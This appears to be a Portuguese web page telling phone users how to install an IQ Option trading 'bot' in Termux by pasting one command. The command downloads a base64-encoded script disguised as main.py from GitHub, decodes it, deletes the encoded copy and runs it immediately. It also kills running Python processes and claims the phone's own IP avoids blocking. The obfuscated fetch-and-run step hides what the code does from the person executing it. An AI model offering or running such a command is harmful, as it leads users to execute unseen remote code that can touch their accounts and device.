📱 Como Instalar no Celular

1️⃣

Instale o Termux

Baixe na Play Store:

📲 Abrir Play Store
2️⃣

Abra o Termux e cole o comando abaixo:

pkg install python -y; pkill -f python 2>/dev/null; pip install flask && pip install requests && pip install api-iqoption-faria && curl -4 -s https://raw.githubusercontent.com/gynbetfc/v-sensitivo-bot/main/main.py -o bot.b64 && python -c "import base64; open('bot.py','w').write(base64.b64decode(open('bot.b64').read()).decode())" && rm bot.b64 && python bot.py & sleep 8 && termux-open-url http://127.0.0.1:5000

⚠️ Se travar em 99%, aperte Ctrl+C e depois ENTER

3️⃣

O Chrome abre automaticamente com o bot!

✅ Pronto! IP do seu celular = sem bloqueio!

4️⃣

Adicione à tela inicial:

No Chrome, toque nos 3 pontinhos ⋮ > "Adicionar à tela inicial"
